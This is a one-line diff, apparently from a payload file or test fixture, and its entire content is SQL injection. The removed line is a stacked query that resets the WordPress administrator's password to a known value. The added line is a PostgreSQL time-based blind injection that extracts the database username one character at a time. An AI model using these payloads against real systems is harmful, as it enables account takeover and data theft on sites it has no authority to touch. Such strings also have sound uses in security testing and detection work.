@@ -1,1 +1,1 @@
-1; UPDATE wp_users SET user_pass=MD5('kkk123123') WHERE ID=1;
+1' AND (SELECT CASE WHEN (SUBSTRING(usename FROM 1 FOR 1) = 'a') THEN pg_sleep(10) ELSE NULL END FROM pg_user LIMIT 1)-- 
